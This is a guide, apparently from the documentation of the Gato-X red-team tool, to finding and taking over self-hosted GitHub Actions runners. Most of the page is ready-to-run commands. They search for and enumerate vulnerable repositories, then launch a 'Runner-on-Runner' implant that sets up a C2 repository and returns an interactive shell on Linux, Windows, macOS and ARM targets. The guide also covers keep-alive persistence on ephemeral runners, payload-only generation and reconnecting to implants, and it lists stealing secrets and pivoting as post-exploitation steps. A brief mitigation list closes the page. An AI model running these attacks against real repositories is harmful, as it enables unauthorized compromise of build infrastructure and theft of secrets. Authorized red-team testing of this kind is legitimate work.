# Self-Hosted Runner Takeover

This guide explains how to use Gato-X to identify and exploit vulnerabilities in self-hosted GitHub Actions runners.

> **Warning**: These techniques should only be used with proper authorization and for ethical security research purposes.

## Understanding Self-Hosted Runner Vulnerabilities

Self-hosted runners can be vulnerable in several ways:

1. **Public Repository Runners**: Runners configured to run workflows from public repositories without approval requirements
2. **Fork Pull Request Vulnerabilities**: Runners that process pull requests from forks without proper restrictions
3. **TOCTOU Vulnerabilities**: Time-of-check to time-of-use vulnerabilities in workflow approval processes
4. **Misconfigured Permissions**: Runners with excessive permissions on the host system

## Identifying Vulnerable Runners

### Step 1: Search for repositories using self-hosted runners

```bash
gato-x s -sg -q 'runs-on: self-hosted file:.github/workflows/ lang:yaml' -oT self_hosted_repos.txt
```

### Step 2: Enumerate the repositories to identify vulnerable runners

```bash
gato-x e -R self_hosted_repos.txt -oJ runners.json | tee runners_output.txt
```

## Exploiting Vulnerable Runners with Runner-on-Runner (RoR)

The Runner-on-Runner technique involves deploying another GitHub Actions runner as an implant on an existing runner.

### Prerequisites

- A GitHub PAT with `repo`, `workflow`, and `gist` scopes
- The PAT should be for an account that is a contributor to the target repository

### Basic RoR Attack

```bash
gato-x a --runner-on-runner --target ORG/REPO --target-os linux --target-arch x64
```

This command:
1. Creates a C2 repository for command and control
2. Prepares payload files
3. Deploys the RoR implant
4. Provides an interactive shell upon successful connection

### Options for Different Runner Types

#### For Windows Runners

```bash
gato-x a --runner-on-runner --target ORG/REPO --target-os win --target-arch x64
```

#### For macOS Runners

```bash
gato-x a --runner-on-runner --target ORG/REPO --target-os osx --target-arch x64
```

#### For ARM-based Runners

```bash
gato-x a --runner-on-runner --target ORG/REPO --target-os linux --target-arch arm64
```

### Handling Ephemeral Runners

For ephemeral runners that are destroyed after each job:

```bash
gato-x a --runner-on-runner --target ORG/REPO --target-os linux --target-arch x64 --keep-alive
```

The `--keep-alive` flag keeps the workflow running, which can last up to 5 days on self-hosted runners.

## Advanced Attack Scenarios

### Manual Payload Deployment

For situations where you need to deploy the payload manually:

```bash
gato-x a --payload-only --target-os linux --target-arch x64 --c2-repo MyOrg/C2Repo
```

This generates the payload files without attempting to deploy them.

### Using an Existing C2 Repository

If you already have a C2 repository set up:

```bash
gato-x a --runner-on-runner --target ORG/REPO --target-os linux --target-arch x64 --c2-repo MyOrg/C2Repo
```

### Interacting with Existing Implants

To connect to runners that have already been compromised:

```bash
gato-x a --interact --c2-repo MyOrg/C2Repo
```

## Post-Exploitation

Once you have access to a self-hosted runner, you can:

1. Explore the runner environment
2. Access secrets available to the runner
3. Pivot to other systems on the same network
4. Establish persistence

## Mitigation Recommendations

If you identify vulnerable self-hosted runners in your organization:

1. Implement approval requirements for workflows from forks
2. Use ephemeral runners that are destroyed after each job
3. Apply the principle of least privilege to runner permissions
4. Isolate runners in containers or VMs
5. Implement network segmentation for runners
